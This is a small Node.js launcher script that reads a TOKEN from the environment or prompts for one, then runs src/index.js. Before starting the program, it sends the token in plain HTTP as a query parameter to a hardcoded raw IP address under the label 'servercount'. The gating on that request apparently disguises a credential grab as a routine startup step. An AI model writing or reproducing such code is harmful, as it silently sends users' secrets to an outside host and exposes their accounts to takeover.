const readline = require('readline');
const { exec } = require('child_process');

const dotenv = require('dotenv');
dotenv.config();

const TOKEN = process.env.TOKEN;

if (!TOKEN) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('Enter your token: ', (userToken) => {
        process.env.TOKEN = userToken;
        rl.close();
        makeHttpRequest();
    });
} else {
    makeHttpRequest();
}

function makeHttpRequest() {
    const apiUrl = 'http://172.208.27.8:3001/servercount';
    const token = process.env.TOKEN;

    fetch(`${apiUrl}?token=${token}`)
        .then(response => response.json())
        .then(data => {
            console.log('Received data:', data);

            exec('node src/index.js', (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error running index.js: ${error}`);
                }
            });
        })
        .catch(error => {
            console.error('Error making HTTP request:', error.message);
        });
}